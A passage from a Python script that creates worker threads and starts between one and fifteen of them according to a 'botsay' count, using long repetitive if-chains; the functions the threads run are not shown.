t11= threading.Thread(target=d11)
t12= threading.Thread(target=d12)
t13= threading.Thread(target=d13)
t14= threading.Thread(target=d14)
t15= threading.Thread(target=d15)

t1.start()

if botsay==2 or botsay==3 or botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 :
	t2.start()
if botsay==3 or botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 :
	t3.start()
if botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 :
	t4.start()
if botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 :
	t5.start()
if botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 :
	t6.start()
if botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 :
	t7.start()
if botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 :
	t8.start()
if botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 :
	t9.start()
if botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 :
	t10.start()
if botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 :
	t11.start()
if botsay==12 or botsay==13 or botsay==14 or botsay==15 :
	t12.start()
if botsay==13 or botsay==14 or botsay==15 :
	t13.start()
if botsay==14 or botsay==15 :
	t14.start()
if botsay==15 :
	t15.start()
